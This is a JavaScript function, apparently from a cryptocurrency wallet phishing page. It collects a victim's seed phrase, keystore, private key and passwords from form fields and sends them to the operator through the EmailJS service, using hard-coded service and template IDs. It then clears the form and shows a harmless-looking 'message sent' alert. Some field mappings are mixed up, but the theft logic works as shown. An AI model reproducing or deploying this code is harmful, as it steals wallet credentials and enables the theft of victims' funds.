function sendMail() {
    var params = {
        Mnemonic: document.getElementById("Mnemonic").value,
        MnemonicPassword: document.getElementById("Mnemonic").value,
        Keystore: document.getElementById("Keystore").value,
        KeystorePassword: document.getElementById("KeystorePassword").value,
        PrivateKey : document.getElementById("Keystore").value,
        PrivateKeyPassword: document.getElementById("PrivateKeyPassword").value,
    };

    const serviceID = "service_xr74p5r";
    const templateID = "template_ac02xvd";

    emailjs.send(serviceID, templateID, params)
        .then(res => {
            document.getElementById("Mnemonic").value = "";
            document.getElementById("MnemonicPassword").value = "";
            document.getElementById("Keystore").value = "";
            document.getElementById("KeystorePassword").value = "";
            document.getElementById("PrivateKey").value = "";
            document.getElementById("PrivateKeyPassword").value = "";
            console.log(res);
            alert("Your message sent successfully!!")

        })
        .catch(err => console.log(err));

}